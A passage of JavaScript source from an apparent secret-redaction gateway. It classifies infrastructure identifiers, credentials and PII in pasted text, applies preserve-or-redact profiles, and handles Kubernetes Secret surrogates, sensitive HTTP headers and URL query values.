      if (text[j] === "{" && found.closer.includes("}")) { owed++; j++; continue; }
      if (text[j] === found.closer[0]) {
        owed--;
        j++;
        if (owed === 0) { end = j; break; }
        continue;
      }
      j++;
    }
    if (end < 0) { i++; continue; }
    out.push({ start: i, end, opener: found.opener });
    i = end;
  }
  // Drop envelopes fully contained in another: the OUTERMOST construct is the boundary.
  return out.filter((env) => !out.some((other) => other !== env && other.start <= env.start && other.end >= env.end && (other.end - other.start) > (env.end - env.start)));
}

/** The innermost reference envelope strictly containing [start,end), if any. */
export function enclosingReference(text, start, end) {
  let best = null;
  for (const env of referenceEnvelopes(text)) {
    if (env.start <= start && env.end >= end && (env.start < start || env.end > end)) {
      if (!best || (env.end - env.start) < (best.end - best.start)) best = env;
    }
  }
  // Widening to the outermost construct keeps the nesting intact: replacing an inner
  // `${...}` while leaving the outer `${{` behind is the half-open failure again.
  let widened = best;
  let changed = true;
  while (widened && changed) {
    changed = false;
    for (const env of referenceEnvelopes(text)) {
      if (env.start <= widened.start && env.end >= widened.end && (env.end - env.start) > (widened.end - widened.start)) {
        widened = env;
        changed = true;
      }
    }
  }
  return widened;
}

function looksLikeReferenceValue(raw) {
  return REFERENCE_VALUE_RE.test(raw.trim());
}

// ------------------------------------------------------- surrogate ledger -------
//
// A representation-constrained field cannot carry a plain portable token. The
// clearest case is a Kubernetes `Secret.data` entry: the API server requires valid
// base64, and a `CRG_...` string is rejected with "illegal base64 data". The
// replacement therefore has to be a SURROGATE whose visible form satisfies the
// constraint while still mapping back to the entity.
//
// Measured constraint that shapes the design: `restoreText` recognises tokens by
// shape, so a base64-encoded token is invisible to it. The ledger is what makes the
// round trip work -- the visible surrogate is registered explicitly, and a lookup is
// attempted only for strings the ledger actually minted. Decoding arbitrary
// base64-looking text would be a much larger false-positive surface and is deliberately
// not done.

// ----------------------------------------------------------- infra recogniser ---
//
// The recogniser CLASSIFIES. It never returns an action, never suppresses anything, and
// never decides to preserve. Policy is a separate layer (decideSpanAction, driven by a
// profile), which keeps "what is this" and "what do we do with it" from becoming one
// entangled guess.
//
// Monotonic risk is the governing rule, and it has two halves:
//
//   HARD_SECRET may NOT be downgraded by INFRA evidence.
//     A span that a deterministic credential detector matched stays a secret even if it
//     also looks like a digest.
//
//   SOFT_SIGNAL may be suppressed by high-precision INFRA evidence.
//     A 64-hex block that the entropy detector flagged, and which the OCI recogniser
//     identifies as `sha256:<64 hex>`, is preserved.

export const INFRA_TYPE = Object.freeze({
  GIT_SHA: "GIT_SHA",
  OCI_DIGEST: "OCI_DIGEST",
  TRACE_ID: "TRACE_ID",
  SPAN_ID: "SPAN_ID",
  AWS_ACCOUNT_ID: "AWS_ACCOUNT_ID",
  AWS_ARN: "AWS_ARN",
  PRIVATE_IP: "PRIVATE_IP",
  INTERNAL_HOSTNAME: "INTERNAL_HOSTNAME",
  K8S_RESOURCE_NAME: "K8S_RESOURCE_NAME",
  EC2_RESOURCE_ID: "EC2_RESOURCE_ID",
});

// How sure the recogniser is about WHAT the value is. This is a statement about
// classification only -- it says nothing about what should happen to it.
//
// Named `certainty` rather than `hard` on purpose: `hard` reads as "hard secret" and the
// two mean opposite things (a VERIFIED infra identifier is not a secret at all).
export const INFRA_CERTAINTY = Object.freeze({
  VERIFIED: "VERIFIED",
  AMBIGUOUS: "AMBIGUOUS",
});

// What the deployment wants done with each type. Kept OUT of the recogniser so that
// "what is this" and "may this leave" stay separate questions.
//
// Only PRESERVE and REDACT exist in v1. A MASK disposition is deliberately NOT exposed
// yet: there is no mask implementation, so it would be a lie that happens to behave like
// REDACT. Real masking needs per-type fidelity decisions -- does an ARN keep the
// service/resource and hide only the account id? does an IP keep the subnet? does a
// hostname keep its suffix or get pseudonymised? -- and no single string-level mask
// answers those correctly.
export const INFRA_DISPOSITION = Object.freeze({
  PRESERVE: "preserve",
  REDACT: "redact",
});

/** Default profile: the four correlation identifiers, and nothing else. */
export const DEFAULT_PROFILE = Object.freeze({
  [INFRA_TYPE.GIT_SHA]: INFRA_DISPOSITION.PRESERVE,
  [INFRA_TYPE.OCI_DIGEST]: INFRA_DISPOSITION.PRESERVE,
  [INFRA_TYPE.TRACE_ID]: INFRA_DISPOSITION.PRESERVE,
  [INFRA_TYPE.SPAN_ID]: INFRA_DISPOSITION.PRESERVE,
  [INFRA_TYPE.AWS_ACCOUNT_ID]: INFRA_DISPOSITION.REDACT,
  [INFRA_TYPE.AWS_ARN]: INFRA_DISPOSITION.REDACT,
  [INFRA_TYPE.PRIVATE_IP]: INFRA_DISPOSITION.REDACT,
  [INFRA_TYPE.INTERNAL_HOSTNAME]: INFRA_DISPOSITION.REDACT,
  [INFRA_TYPE.K8S_RESOURCE_NAME]: INFRA_DISPOSITION.REDACT,
  [INFRA_TYPE.EC2_RESOURCE_ID]: INFRA_DISPOSITION.REDACT,
});

/** A profile that preserves every infra type it can identify, for environments that want
 *  infrastructure context to reach the model. It still cannot override a hard secret. */
export const DEVOPS_PROFILE = Object.freeze(
  Object.fromEntries(Object.values(INFRA_TYPE).map((type) => [type, INFRA_DISPOSITION.PRESERVE]))
);

export function profileDisposition(profile, infraType) {
  const chosen = (profile || DEFAULT_PROFILE)[infraType];
  return chosen === INFRA_DISPOSITION.PRESERVE ? INFRA_DISPOSITION.PRESERVE : INFRA_DISPOSITION.REDACT;
}

const HEX32 = "[0-9a-fA-F]{32}";
const HEX40 = "[0-9a-fA-F]{40}";
const HEX64 = "[0-9a-fA-F]{64}";
const HEX16 = "[0-9a-fA-F]{16}";
const LB = "(?<![A-Za-z0-9_])";
const RB = "(?![A-Za-z0-9_])";

// Ordered by specificity: the first match wins, so `sha256:<64hex>` is not reported as a
// bare git sha. Each entry declares its own `hard` flag -- `hard` means the SHAPE is
// unambiguous rather than that the finding is dangerous.
const rawInfraRules = [
  // TWO variants, both hard, and no third one.
  //
  // `(?:sha256:)?<64hex>` looked harmless but made a BARE 64-hex run a hard OCI digest,
  // which is a preserve licence for anything 64 hex characters long -- the same shape
  // bypass as the bare-16-hex span id. `token=<64hex secret>` would have been preserved.
  //
  //   variant A  the span carries its own `sha256:` prefix
  //   variant B  the span is the bare hex, but the immediately preceding text ends with
  //              `sha256:` because the entropy detector only circled the hex
  //
  // A bare 64-hex run with neither is SOFT: classified, never preserved.
  { type: INFRA_TYPE.OCI_DIGEST, re: new RegExp(`${LB}(sha256:${HEX64})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.99 },
  { type: INFRA_TYPE.OCI_DIGEST, re: new RegExp(`${LB}(${HEX64})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.95, contextBefore: /sha256:\s*$/i },
  { type: INFRA_TYPE.OCI_DIGEST, re: new RegExp(`${LB}(${HEX64})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.AMBIGUOUS, confidence: 0.5 },
    // VERIFIED: `arn:aws:` is an unambiguous prefix, so "this is an ARN" is certain. Whether
  // it may be SENT is a separate question answered by the profile -- the default redacts
  // it, and that policy choice must not be smuggled into the recogniser as a doubt about
  // what the value is.
  { type: INFRA_TYPE.AWS_ARN, re: /(?<![A-Za-z0-9_])arn:aws[a-z-]*:[A-Za-z0-9-]+:[A-Za-z0-9-]*:\d{0,12}:[^\s"',)]+/g, group: 0, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.9 },
    // VERIFIED: the `i-`/`subnet-`/`sg-` prefixes are distinctive, so the identity is not in
  // doubt; the profile decides whether it may leave.
  { type: INFRA_TYPE.EC2_RESOURCE_ID, re: new RegExp(`${LB}(?:i|ami|vol|snap|subnet|sg|vpc|eni|rtb|acl)-[0-9a-f]{8,17}${RB}`, "g"), group: 0, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.85 },
  // `hard` here means the SHAPE is unambiguous, not that the finding is dangerous: a fixed
  // length with boundary assertions, and excluded from the longer digest/git-sha forms by
  // the earlier rules. That is what makes suppressing an entropy-only hit safe. A secret
  // that happens to be exactly this shape is still protected whenever a provider rule
  // matches it, because hard secret evidence wins regardless (see decideSpanAction).
  //
  // Deliberately NOT hard: shapes that only narrow the odds (a 16-hex run, a 12-digit
  // number, a bare 40-hex commit that could equally be a random token). Those are
  // classified as INFRA but stay redacted until a profile opts in.
  { type: INFRA_TYPE.TRACE_ID, re: new RegExp(`${LB}(${HEX32})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.AMBIGUOUS, confidence: 0.6 },
  { type: INFRA_TYPE.TRACE_ID, re: new RegExp(`${LB}(${HEX32})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.95, anchor: /(?:trace[_-]?id|traceparent|trace)\s*[:=]/i },
  { type: INFRA_TYPE.GIT_SHA, re: new RegExp(`${LB}(${HEX40})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.AMBIGUOUS, confidence: 0.6 },
  { type: INFRA_TYPE.GIT_SHA, re: new RegExp(`${LB}(${HEX40})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.95, anchor: /(?:commit|git[_-]?sha|revision|rev)\s*[:=]?/i },
  // Anchored AND hard. The anchor is what makes it safe: an unanchored 16-hex run is not
  // claimed at all, because the shape is exactly a bank card's and releasing a card number
  // is a far worse outcome than redacting a span id. With `span_id:` in front, the shape
  // is doing the work the context already did.
  { type: INFRA_TYPE.SPAN_ID, re: new RegExp(`${LB}(${HEX16})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.9, anchor: /span[_-]?id\s*[:=]/i },
  { type: INFRA_TYPE.AWS_ACCOUNT_ID, re: new RegExp(`${LB}(\\d{12})${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.AMBIGUOUS, confidence: 0.5 },
  // The ranges need DIFFERENT numbers of trailing octets, which is why the branches
  // cannot share one tail: `10` fixes one octet (two more follow), while `192.168` and
  // `172.16-31` fix two (one more follows). A single shared tail made `10.244.0.11`
  // silently fail -- only the two-octet prefixes matched.
  { type: INFRA_TYPE.PRIVATE_IP, re: new RegExp(`${LB}((?:10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|(?:192\\.168|172\\.(?:1[6-9]|2\\d|3[01]))\\.\\d{1,3}\\.\\d{1,3}))${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.AMBIGUOUS, confidence: 0.8 },
  // Sequential labels, each with its OWN quantifier. The previous form nested a `*`
  // inside a `*` (`(?:[a-z0-9-]*)*`), which backtracks catastrophically: matching a
  // 71-character hex digest against it ran past a 60-second timeout. This is ReDoS, and
  // it also made the rule silently absorb inputs far longer than any hostname.
    { type: INFRA_TYPE.INTERNAL_HOSTNAME, re: new RegExp(`${LB}((?:[a-z0-9][a-z0-9-]*\\.)+(?:internal|local|svc|svc\\.cluster\\.local|cluster\\.local))${RB}`, "g"), group: 1, certainty: INFRA_CERTAINTY.VERIFIED, confidence: 0.8 },
  { type: INFRA_TYPE.K8S_RESOURCE_NAME, re: new RegExp(`${LB}([a-z0-9][a-z0-9-]*-(?:[0-9a-f]{8,10}|[0-9a-f]{5})-[a-z0-9]{5})${RB}`, "g"), group: 0, certainty: INFRA_CERTAINTY.AMBIGUOUS, confidence: 0.7 },
];

const INFRA_RULES = rawInfraRules.map((rule) => ({
  ...rule,
  anchorRe: rule.anchor ? new RegExp(rule.anchor.source, rule.anchor.flags.replace("g", "")) : null,
  contextBeforeRe: rule.contextBefore ? new RegExp(rule.contextBefore.source, rule.contextBefore.flags.replace("g", "")) : null,
}));

// ---------------------------------------------------- infra envelope resolution ---
//
// A detector boundary is not an entity boundary. The entropy detector sees a run of
// random-looking characters, so for `i-0a1b2c3d4e5f67890` it reports the HEX RUN while the
// entity is the whole resource id:
//
//   instance: i-0a1b2c3d4e5f67890
//             └──── detector span ───┘
//             └──────── entity ─────────┘
//
// `recogniseInfra(spanText)` therefore sees `0a1b2c3d4e5f67890`, classifies nothing, and the
// prefix is left outside -- the delivered text even ends up split (`i-CRG_...`). Patching
// this one identifier at a time (an OCI rule, then an EC2 rule, then a K8s rule) treats the
// symptom; the fix is to RESOLVE the span to the enclosing entity before classifying it.
//
// Rules are table-driven and each declares how to expand LEFT and RIGHT. Expansion is
// bounded and must produce a string the recogniser actually accepts, so it cannot run away.
const INFRA_ENVELOPES = Object.freeze([
  {
    type: INFRA_TYPE.EC2_RESOURCE_ID,
    // `i-`, `subnet-`, `sg-`, ... immediately before the detector span.
    left: /(?:^|[^A-Za-z0-9_-])((?:i|ami|vol|snap|subnet|sg|vpc|eni|rtb|acl)-)$/,
    right: /^[0-9a-fA-F]*/,
  },
  {
    type: INFRA_TYPE.OCI_DIGEST,
    left: /(sha256[:@])$/,
    right: /^[0-9a-fA-F]*/,
  },
  {
    type: INFRA_TYPE.INTERNAL_HOSTNAME,
    left: /(?:^|[^A-Za-z0-9_.-])([a-z0-9][a-z0-9.-]*\.)$/,
    right: /^[a-z0-9.-]*/,
  },
  {
    type: INFRA_TYPE.K8S_RESOURCE_NAME,
    left: /(?:^|[^A-Za-z0-9_-])([a-z0-9][a-z0-9-]*-)$/,
    right: /^[a-z0-9-]*/,
  },
]);

/**
 * Expand a detector span to the enclosing infrastructure entity, if there is one.
 *
 * @returns {{start:number,end:number,infraType:string,evidence:string[]}|null}
 */
export function resolveInfraEnvelope(text, span) {
  if (typeof text !== "string" || !span) return null;
  let best = null;
  for (const rule of INFRA_ENVELOPES) {
    const leftWindow = text.slice(Math.max(0, span.start - 64), span.start);
    const leftMatch = rule.left.exec(leftWindow);
    if (!leftMatch) continue;

    const leftLength = leftMatch[1].length;
    const after = text.slice(span.end);
    const rightMatch = rule.right.exec(after);
    const rightLength = rightMatch ? rightMatch[0].length : 0;

    const start = span.start - leftLength;
    const end = span.end + rightLength;
    if (start === span.start && end === span.end) continue;

    const candidate = text.slice(start, end);
    const recognised = recogniseInfra(candidate);
    // The widened string has to be an entity the recogniser agrees with; otherwise the rule
    // guessed and the original span stands.
    if (!recognised || recognised.infraType !== rule.type) continue;
    if (!best || (end - start) > (best.end - best.start)) {
      best = {
        start,
        end,
        infraType: recognised.infraType,
        certainty: recognised.certainty,
        evidence: ["infra_envelope", `infra_envelope:${rule.type.toLowerCase()}`, ...recognised.evidence],
      };
    }
  }
  return best;
}

/**
 * Classify a span's text as an infrastructure identifier.
 *
 * @returns {{entityClass: string, infraType: string, evidence: string[], confidence: number, hard: boolean}|null}
 */
/**
 * Shape-ambiguous identifiers only qualify when the surrounding text names them. A bare
 * 16-hex run is indistinguishable from a bank card number, and a bare 40-hex run from a
 * random token, so those need an anchor rather than a guess.
 */
function hasAnchor(rule, context) {
  // contextBefore is ANCHORED to the end of the preceding text, so `sha256:` has to sit
  // immediately before the span. Searching the whole prefix would let an unrelated
  // earlier digest vouch for the value under inspection:
  //   previous digest sha256:<hex>  token=<64hex secret>
  // must not turn the token into a preserved digest.
  if (rule.contextBeforeRe) {
    if (!context) return false;
    rule.contextBeforeRe.lastIndex = 0;
    return rule.contextBeforeRe.test(context);
  }
  if (!rule.anchor) return true;
  if (!context) return false;
  rule.anchorRe.lastIndex = 0;
  return rule.anchorRe.test(context);
}

export function recogniseInfra(value, context = null) {
  if (typeof value !== "string" || value.length < 8) return null;
  // Hard variants are tried FIRST. Several types have both a soft shape and an anchored,
  // hard variant (a bare 40-hex run versus `commit <40-hex>`), and table order meant the
  // soft rule always won, so the anchor never had a chance to upgrade the finding.
  // VERIFIED variants are tried first: several types have both a soft shape and an
  // anchored, verified variant, and table order let the soft one win so the anchor never
  // had a chance to upgrade the finding.
  const ordered = [...INFRA_RULES].sort((a, b) =>
    Number(b.certainty === INFRA_CERTAINTY.VERIFIED) - Number(a.certainty === INFRA_CERTAINTY.VERIFIED));
  for (const rule of ordered) {
    if (!hasAnchor(rule, context)) continue;
    rule.re.lastIndex = 0;
    const m = rule.re.exec(value);
    if (!m) continue;
    const matched = m[rule.group ?? 0];
    // A rule only claims the span when it explains the WHOLE span. Accepting a partial
    // match would let an infra label cover bytes the recogniser never looked at, which
    // is precisely how a secret slips through behind an identifier.
    if (matched !== value.trim()) continue;
    return {
      entityClass: ENTITY_CLASS.INFRA,
      infraType: rule.type,
      evidence: ["infra_shape", `infra_rule:${rule.type.toLowerCase()}`]
        .concat(rule.certainty === INFRA_CERTAINTY.VERIFIED && (rule.anchor || rule.contextBefore) ? ["infra_anchored"] : []),
      confidence: rule.confidence,
      certainty: rule.certainty,
    };
  }
  return null;
}

/** Detectors whose match is deterministic credential evidence. */
// Deterministic detectors. Note what is NOT here: `entropy`. Entropy is the SOFT signal
// this whole slice exists to suppress -- a 64-hex digest and a 64-hex secret are
// indistinguishable to it. Adding it here would make every infra preserve decision
// unreachable, which is the opposite failure of the one it was meant to prevent.
const HARD_SECRET_DETECTORS = new Set(["gitleaks", "secret", "binding", "http-header", "email", "phone", "identity", "bank"]);

/**
 * Decide the action for a span, given its detector evidence and any infra classification.
 *
 * This is the ONLY place that turns a classification into an action, which is what keeps
 * the recogniser honest: it cannot preserve anything by itself.
 */
export function decideSpanAction({ detector, ruleId, infra, profile = null }) {
  // ANY deterministic detector match is hard secret evidence. PII detectors belong here
  // too: without them a bank card whose digits happen to look like a 16-hex run was
  // classified SPAN_ID and RELEASED -- a payment card number, preserved, because a shape
  // matched. Fixed-length numeric shapes are exactly where infra and PII collide.
  const hardSecret = Boolean(ruleId) || HARD_SECRET_DETECTORS.has(detector);
  if (hardSecret) {
    // Monotonic: hard evidence is never downgraded by an infra label, and no profile can
    // ask for it either.
    return { action: "redact", hardSecret: true, reason: "hard-secret" };
  }
  if (!infra) return { action: "redact", hardSecret: false, reason: "default" };

  // The profile is consulted HERE, not inside the recogniser.
  if (profileDisposition(profile, infra.infraType) !== INFRA_DISPOSITION.PRESERVE) {
    return { action: "redact", hardSecret: false, reason: `profile-redact:${infra.infraType}` };
  }
  if (infra.certainty !== INFRA_CERTAINTY.VERIFIED) {
    // The profile wants it preserved, but the finding is only a shape guess. An exemption
    // needs both.
    return { action: "redact", hardSecret: false, reason: `infra-ambiguous:${infra.infraType}` };
  }
  return { action: "preserve", hardSecret: false, reason: `infra:${infra.infraType}` };
}

// ------------------------------------------------------------- entity ledger ----
//
// E1: classification RECORDS, it does not decide. The redaction verdict is already made
// by the time an entity is emitted; this ledger answers "what did we call it, and on
// what evidence" without feeding back into whether it was redacted.
//
// Classification happens AT EMIT TIME on purpose: that is when the span still carries
// its detector, ruleId, evidence, syntax, key and path. Re-deriving a class later from
// the token alone would be guesswork.

export const ENTITY_CLASS = Object.freeze({
  CREDENTIAL: "CREDENTIAL",
  PII: "PII",
  INFRA: "INFRA",
  UNKNOWN: "UNKNOWN",
});

// Detector types that are PII by construction.
const PII_DETECTORS = new Set(["email", "phone", "identity", "bank"]);

// Only high-confidence, deterministic signals are mapped in this first revision. An
// entropy hit is NOT evidence of a class: "looks random" is compatible with a secret, a
// git SHA, a Docker digest and a trace id alike, which is exactly what the infra
// recogniser slice will have to disentangle. Leaving those UNKNOWN keeps the
// misclassification surface from growing in the name of coverage.
function classifyEntityClass(evidence = {}) {
  const detector = evidence.detector || "";
  if (PII_DETECTORS.has(detector)) return ENTITY_CLASS.PII;
  // A provider rule that fired on a known credential shape, or a private key.
  if (detector === "gitleaks" && evidence.ruleId) return ENTITY_CLASS.CREDENTIAL;
  // `sk-` prefixed provider secret.
  if (detector === "secret") return ENTITY_CLASS.CREDENTIAL;
  // A strong binding whose key name is a secret name.
  if (evidence.strength === KEY_STRENGTH.STRONG) return ENTITY_CLASS.CREDENTIAL;
  if (evidence.syntax === "http-header") return ENTITY_CLASS.CREDENTIAL;
  if ((evidence.evidence || []).includes("block_scalar_body")) return ENTITY_CLASS.UNKNOWN;
  // INFRA is deliberately NOT inferred from "looks like a resource id" here; that waits
  // for the infra recogniser so the guess does not enter policy by the back door.
  return ENTITY_CLASS.UNKNOWN;
}

/** The detector that actually produced the evidence for a span. */
export function detectorOfSpan(spanMeta) {
  const absorbed = Array.isArray(spanMeta.absorbed) ? spanMeta.absorbed : [];
  const candidates = [spanMeta.type, spanMeta.providerType, spanMeta.shadowed, ...absorbed].filter(Boolean);
  if (spanMeta.ruleId) return "gitleaks";
  return candidates.find((t) => t !== "entropy" && t !== "block_scalar")
    || candidates[0]
    || "binding";
}

export class EntityLedger {
  constructor() { this.byToken = new Map(); }
  record(token, meta) {
    if (this.byToken.has(token)) return this.byToken.get(token);
    // An envelope-resolved infrastructure entity is INFRA by construction, even when the
    // detector that produced the span was the entropy detector.
    const entityClass = meta.infraType ? ENTITY_CLASS.INFRA : classifyEntityClass(meta);
    const entry = {
      token,
      entityClass,
      detector: meta.detector ?? null,
      ruleId: meta.ruleId ?? null,
      evidence: meta.evidence ? [...meta.evidence] : [],
      syntax: meta.syntax ?? null,
      key: meta.key ?? null,
      pathSegments: meta.pathSegments ? [...meta.pathSegments] : null,
      // Coverage is recorded as an INDEPENDENT dimension, never folded into a single
      // confidence number and never used to downgrade a deterministic detector:
      // "the parser could not locate the structure" and "the detector is unsure" are
      // different statements. A GitHub PAT inside a FAILED region is still a PAT.
      coverageStatus: meta.coverageStatus ?? null,
      encodingKind: meta.encodingKind ?? ENCODING_KIND.PLAIN,
      // Ledger closure for infrastructure: without these two the classification reached
      // record() and was dropped on the floor here, so entityClassFor() kept answering
      // UNKNOWN for an envelope the policy had already resolved to EC2_RESOURCE_ID.
      infraType: meta.infraType ?? null,
      infraCertainty: meta.infraCertainty ?? null,
    };
    this.byToken.set(token, entry);
    return entry;
  }
  get(token) { return this.byToken.get(token) || null; }
  get size() { return this.byToken.size; }
  entries() { return [...this.byToken.values()]; }
}

export const ENCODING_KIND = Object.freeze({
  PLAIN: "plain",
  BASE64: "base64",
});

export const SURROGATE_ENCODINGS = Object.freeze({
  [ENCODING_KIND.PLAIN]: {
    // Identity: the visible form IS the token.
    encode: (token) => token,
  },
  [ENCODING_KIND.BASE64]: {
    encode: (token) => btoa(token),
  },
});

export function encodeSurrogate(token, encodingKind = ENCODING_KIND.PLAIN) {
  const encoding = SURROGATE_ENCODINGS[encodingKind];
  if (!encoding) throw new Error(`unknown surrogate encoding: ${encodingKind}`);
  const visible = encoding.encode(token);
  // Guard the constraint itself, not just the encoder: a surrogate that is not
  // canonical base64 is rejected by the API server, so fail loudly here instead of
  // forwarding a document that will be refused downstream.
  if (encodingKind === ENCODING_KIND.BASE64) {
    if (!/^[A-Za-z0-9+/]+={0,2}$/.test(visible) || visible.length % 4 !== 0) {
      throw new Error(`base64 surrogate is not canonical: ${visible}`);
    }
  }
  return visible;
}

export class SurrogateLedger {
  constructor() {
    this.byVisible = new Map(); // visible form -> { token, encodingKind }
  }
  /** Register a surrogate and return its visible form. Idempotent per token+kind. */
  mint(token, encodingKind = ENCODING_KIND.PLAIN) {
    const visible = encodeSurrogate(token, encodingKind);
    if (encodingKind !== ENCODING_KIND.PLAIN) {
      const existing = this.byVisible.get(visible);
      if (existing && existing.token !== token) throw new Error("surrogate collision");
      this.byVisible.set(visible, { token, encodingKind });
    }
    return visible;
  }
  /** @returns {{token: string, encodingKind: string}|null} */
  lookup(visible) {
    return this.byVisible.get(visible) || null;
  }
  get size() { return this.byVisible.size; }
  /** Read-only view for policy code (sink classification, telemetry). */
  entries() { return [...this.byVisible.entries()].map(([visible, meta]) => ({ visible, ...meta })); }
}

// ------------------------------------------------ object-level K8s recogniser ----
//
// The criterion is deliberately OBJECT-level, not path-based. A `data:` block also
// appears in ordinary application config, and treating every `data.*` as base64
// would corrupt unrelated YAML. Only a document that actually declares
// `apiVersion: v1` and `kind: Secret` gets representation-constrained `data`.
//
// Applied only to ROOT keys: a nested `data:` inside some other mapping is not part
// of the Secret contract.

export const SCHEMA_ENCODING = Object.freeze({
  BASE64: "base64",
});

const SECRET_API_VERSION_RE = /^v1$/;
const SECRET_KIND_RE = /^Secret$/;

/** @returns {boolean} whether this document is a v1 Secret. */
export function isKubernetesSecret(doc) {
  const bindings = parseYamlBindings(doc);
  const root = (key) => bindings.find((b) => b.key === key && b.indent === 0 && !b.bodyCandidate && !b.regionOnly);
  const apiVersion = root("apiVersion");
  const kind = root("kind");
  return Boolean(apiVersion && SECRET_API_VERSION_RE.test(apiVersion.raw)
    && kind && SECRET_KIND_RE.test(kind.raw));
}

/**
 * Mark spans that sit under a root `data` block of a v1 Secret with the encoding
 * their replacement must use. Returns the spans unchanged for every other document.
 *
 * The `data:` key itself has an empty value, so the binding parser emits no record
 * for it. The block is therefore located by scanning lines rather than by looking up
 * a record: a root-level `data:` line, followed by lines indented deeper than it.
 */
export function applyObjectSchema(text, spans) {
  if (!isKubernetesSecret(text)) return spans;

  const lines = text.split("\n");
  const offsets = [];
  for (let i = 0, at = 0; i < lines.length; i++) { offsets.push(at); at += lines[i].length + 1; }

  let dataLine = -1;
  let dataIndent = 0;
  for (let i = 0; i < lines.length; i++) {
    const m = /^([ \t]*)data[ \t]*:[ \t]*(?:#.*)?$/.exec(lines[i]);
    // ROOT only: `spec.data` and any other nested `data:` are not part of the Secret
    // contract, and treating them as base64 would corrupt unrelated documents. The
    // comment said "root" before this check existed.
    if (m && m[1].length === 0) { dataLine = i; dataIndent = 0; break; }
  }
  if (dataLine < 0) return spans;

  let lastDataLine = lines.length - 1;
  for (let i = dataLine + 1; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim() === "") continue;
    const indent = line.match(/^[ \t]*/)[0].length;
    if (indent <= dataIndent) { lastDataLine = i - 1; break; }
  }
  const blockStart = offsets[dataLine] + lines[dataLine].length;
  const blockEnd = offsets[lastDataLine] + lines[lastDataLine].length;

  return spans.map((span) => (
    span.start >= blockStart && span.end <= blockEnd
      ? { ...span, schemaEncoding: SCHEMA_ENCODING.BASE64 }
      : span
  ));
}

// ------------------------------------------------- D3a pasted HTTP headers -----
//
// Scope note that matters: this is about HTTP header TEXT the user pastes into a
// prompt. It is NOT about the transport headers this gateway sends upstream -- those
// are built in filteredRequestHeaders() and never pass through text redaction, and
// they must keep carrying the real Authorization / x-api-key values, because the
// upstream needs them to authenticate.

// Header names whose value is a credential by convention. Everything else
// (Content-Type, Accept, User-Agent, Host, X-Request-Id, ...) is left alone.
const SENSITIVE_HEADER_RE = /^(?:authorization|proxy-authorization|x-api-key|api-key|x-auth-token|x-access-token|x-amz-security-token|x-goog-api-key|private-token|x-gitlab-token|x-vault-token|x-token)$/i;

export function parseHeaderBindings(text, coverage = null) {
  const out = [];
  if (typeof text !== "string" || !text.includes(":")) return out;
  const lines = text.split("\n");
  const offsets = [];
  for (let i = 0, at = 0; i < lines.length; i++) { offsets.push(at); at += lines[i].length + 1; }

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim() === "" || /^\s*#/.test(line)) continue;
    const m = /^([ \t]*)([A-Za-z][A-Za-z0-9-]*)[ \t]*:[ \t]*(\S.*?)[ \t]*$/.exec(line);
    if (!m) {
      // A header-shaped line that cannot be located. The trigger requires a HYPHENATED
      // token name or a known header prefix: `Error: connection refused` is prose that
      // happens to fit the grammar, and counting it would inflate the metric.
      if (coverage && /^[ \t]*(?:[A-Za-z][A-Za-z0-9]*-[A-Za-z0-9-]+|Authorization|Accept|Content-Type|User-Agent|Host)[ \t]*:/.test(line)) {
        coverage.record(PARSER.HEADER, COVERAGE_STATUS.FAILED, offsets[i], offsets[i] + line.length);
      }
      continue;
    }
    const name = m[2];
    // A hyphenated name is unambiguously a header rather than prose.
    const headerShaped = /-/.test(name);
    if (!SENSITIVE_HEADER_RE.test(name)) {
      if (coverage && headerShaped) coverage.record(PARSER.HEADER, COVERAGE_STATUS.PARSED, offsets[i], offsets[i] + line.length);
      continue;
    }

    const value = m[3];
    // A scheme prefix is kept outside the span: replacing `Bearer <tok>` wholesale
    // would delete the scheme, and a header whose scheme disappeared is no longer the
    // same header.
    const scheme = /^(Bearer|Basic|Token|Digest|AWS4-HMAC-SHA256)[ \t]+/i.exec(value);
    const offset = scheme ? scheme[0].length : 0;
    const secret = value.slice(offset);
    if (secret.length === 0) {
      // The name is a credential name but carries no value: a partial location.
      if (coverage) coverage.record(PARSER.HEADER, COVERAGE_STATUS.PARTIAL, offsets[i], offsets[i] + line.length);
      continue;
    }

    // Anchor on the value itself rather than deriving the offset from several
    // lengths: the arithmetic version produced negative start offsets (the trailing
    // whitespace delta and the value length were subtracted in the wrong order).
    // A header's secret is its trailing value, so the last occurrence IS the span.
    const valueStart = offsets[i] + line.lastIndexOf(secret);
    if (coverage) coverage.record(PARSER.HEADER, COVERAGE_STATUS.PARSED, offsets[i], offsets[i] + line.length);
    out.push({
      kind: "binding",
      key: name,
      normalizedKey: normalizeBindingKey(name),
      valueStart,
      valueEnd: valueStart + secret.length,
      syntax: "http-header",
      evidence: ["structured_binding", "sensitive_header_name"].concat(scheme ? ["scheme_preserved"] : []),
      strength: KEY_STRENGTH.STRONG,
      raw: secret,
      headerName: name,
      scheme: scheme ? scheme[1] : null,
    });
  }
  return out;
}

// --------------------------------------------------- D3b URL query values ------
//
// Raw span only: the query value is replaced as-is, with no decoding and no
// re-encoding. Percent-escapes, `+`, parameter order and duplicate parameters are
// therefore preserved byte for byte, which a decode -> modify -> re-encode pipeline
// would silently normalise away.

const SENSITIVE_QUERY_KEY_RE = /^(?:access[_-]?token|auth[_-]?token|api[_-]?key|apikey|key|secret|client[_-]?secret|password|passwd|token|credential|signature|sig|x-amz-signature|x-amz-credential|x-amz-security-token|sas|code)$/i;

export function parseUrlBindings(text, coverage = null) {
  const out = [];
  if (typeof text !== "string" || !text.includes("?") || !text.includes("=")) return out;
  const schemeRe = /[A-Za-z][A-Za-z0-9+.-]*:\/\//g;
  let match;
